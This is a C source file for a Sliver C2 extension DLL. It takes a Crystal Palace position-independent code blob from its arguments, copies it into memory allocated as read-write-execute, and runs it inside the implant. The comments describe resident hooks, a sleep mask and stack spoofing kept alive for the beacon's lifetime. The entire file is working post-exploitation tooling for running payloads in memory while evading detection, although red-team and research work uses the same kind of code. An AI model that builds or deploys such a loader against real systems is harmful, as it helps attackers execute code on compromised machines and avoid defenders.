/*
 * crystal-loader.c
 *
 * Sliver Extension DLL that loads and executes a Crystal Palace PICO blob
 * inside the Sliver implant memory.
 *
 * Sliver Extension entrypoint contract (matches COFFLoader's LoadAndRun):
 *   int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback)
 *
 * argsBuffer layout (BeaconData serialization, single extract):
 *   [pico_len: int32_le][pico_bytes: pico_len]
 *
 * PICO entrypoint convention:
 *   The PICO is produced from postex-loader/loader.spec which uses
 *   '+gofirst' so the symbol 'go' is placed at offset 0. The signature
 *   matches postex-loader/src/loader.c:75:
 *       void go(void * loader_arguments);
 *   loader_arguments is unused after the Xenon patch (CS-specific path
 *   commented out) — we pass NULL.
 *
 * Copyright (c) 2026 Simone Licitra
 * Licensed under the MIT License (see ../../../LICENSE).
 */

#include <windows.h>
#include <stdint.h>
#include <string.h>

#include "beacon_compatibility.h"

#ifndef EXPORT
#define EXPORT __declspec(dllexport)
#endif

typedef int  (*goCallback)(char *, int);
typedef void (*pico_entry_t)(void *);

static void emit(goCallback cb, const char *msg)
{
    if (cb == NULL) return;
    cb((char *)msg, (int)strlen(msg));
}

EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback)
{
    datap parser;
    int pico_size = 0;
    unsigned char *pico_data = NULL;

    if (argsBuffer == NULL || bufferSize == 0) {
        emit(callback, "[crystal-loader] error: empty argsBuffer\n");
        return 1;
    }

    BeaconDataParse(&parser, argsBuffer, (int)bufferSize);

    pico_data = (unsigned char *)BeaconDataExtract(&parser, &pico_size);
    if (pico_data == NULL || pico_size <= 0) {
        emit(callback, "[crystal-loader] error: no PICO blob in arguments\n");
        return 2;
    }

    /* optional runtime args string (second extension argument, type string) */
    int args_len = 0;
    char *runtime_args = BeaconDataExtract(&parser, &args_len);

    /*
     * Allocate RWX. The PICO does its own VirtualProtect calls internally
     * (see postex-loader/src/loader.c fix_section_permissions). Starting
     * RWX simplifies the bootstrap; the PICO will lock down permissions
     * per-section as it loads the embedded DLL.
     */
    void *pico_mem = VirtualAlloc(
        NULL,
        (SIZE_T)pico_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (pico_mem == NULL) {
        emit(callback, "[crystal-loader] error: VirtualAlloc failed\n");
        return 3;
    }

    memcpy(pico_mem, pico_data, (size_t)pico_size);

    emit(callback, "[crystal-loader] executing PICO\n");

    pico_entry_t entry = (pico_entry_t)pico_mem;
    entry((args_len > 0) ? runtime_args : NULL);

    /*
     * Intentionally NOT freeing pico_mem. Crystal Palace's loader chain
     * keeps hooks, sleep mask and Draugr stack-spoof resident next to
     * the loaded DLL for the entire beacon lifetime.
     */

    emit(callback, "[crystal-loader] PICO returned\n");
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;
    (void)fdwReason;
    return TRUE;
}
